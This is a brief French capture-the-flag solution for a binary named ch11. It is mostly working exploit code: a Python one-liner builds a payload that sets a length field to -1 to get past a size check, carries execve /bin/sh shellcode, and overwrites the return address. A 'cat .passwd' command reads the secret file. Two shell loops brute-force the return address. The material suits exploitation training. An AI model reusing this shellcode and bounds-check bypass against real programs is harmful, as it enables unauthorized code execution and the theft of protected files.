python -c "print ('\xff\xff\xff\xff' + '/\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68' + 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZ' + '\xaf\xfb\xff\xbf' + ('A'*700))" > /tmp/input && ./ch11 /tmp/input
cat .passwd

Le code semble etre protege d'un buffer overflow parce qu'il verifie que le nombre d'octets qu'il lira dans le fichier n'est pas superieur a la taille du buffer. Mais nous avons le controle de cette taille, et nous settons -1 (\xff\xff\xff\xff), ce qui passe le check >= 128. Nous pouvons alors exploiter le buffer overflow et executer du code arbitraire, en faisant pointer eip sur notre code dans le buffer


trouver l'offset induit par gdb :
for i in {0,1,2,3,4,5,6,7,8,9,a,b,c,d,e,f}; do for x in {0,1,2,3,4,5,6,7,8,9,a,b,c,d,e,f}; do python -c "print ('\xff\xff\xff\xff' + '/\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68' + 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZ' + '\x$i$x\xfb\xff\xbf' + ('A'*700))" > /tmp/input$i$x ; done ; done

puis :
for i in {0,1,2,3,4,5,6,7,8,9,a,b,c,d,e,f}; do for x in {0,1,2,3,4,5,6,7,8,9,a,b,c,d,e,f}; do echo "$i $x" ; ./ch11 /tmp/input$i$x ; done ; done
